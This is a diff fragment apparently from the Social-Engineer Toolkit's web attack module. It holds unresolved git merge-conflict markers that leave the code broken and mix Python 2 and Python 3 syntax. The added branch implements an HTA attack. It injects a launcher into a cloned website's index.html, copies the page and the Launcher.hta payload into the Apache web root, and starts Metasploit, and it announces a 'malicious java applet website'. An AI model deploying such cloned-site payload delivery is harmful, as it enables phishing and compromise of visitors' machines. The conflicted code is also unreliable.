@@ -353,6 +353,7 @@ try:
             # close the file after done writing
             filewrite.close()
 
+<<<<<<< HEAD
             print((bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win +
                   "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC))
 
@@ -382,6 +383,32 @@ try:
         # selection of browser exploits
         # check to see if multiattack is in use
         multi_meta = "off"
+=======
+            print bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC
+
+	## if we are using HTA attack
+	if check_options("ATTACK_VECTOR") == "HTA":
+		# </body>
+		if os.path.isfile(setdir + "/Launcher.hta"):
+			data1 = file(setdir + "/web_clone/index.html", "r").read()
+			data2 = file(setdir + "/hta_index", "r").read()
+			data3 = data1.replace("</body>", data2 + "</body>")
+			filewrite = file(setdir + "/web_clone/index.html", "w")
+			filewrite.write(data3)
+			filewrite.close()
+			print_status("Copying over files to Apache server...")
+			apache_dir = check_config("APACHE_DIRECTORY=")
+			if os.path.isdir(apache_dir + "/html"): apache_dir = apache_dir + "/html"
+			shutil.copyfile(setdir + "/web_clone/index.html", apache_dir + "/index.html")
+			shutil.copyfile(setdir + "/Launcher.hta", apache_dir + "/Launcher.hta")
+
+			print_status("Launching Metasploit.. Please wait one.")
+			subprocess.Popen("%smsfconsole -r %s/meta_config" % (meta_path(), setdir), shell=True).wait()
+
+        ## selection of browser exploits
+        ## check to see if multiattack is in use
+        multi_meta="off"
+>>>>>>> e1891e7750024253b5c984aa58a226582ffcb2ab
         if os.path.isfile(setdir + "/multi_meta"):
             multi_meta = "on"
 
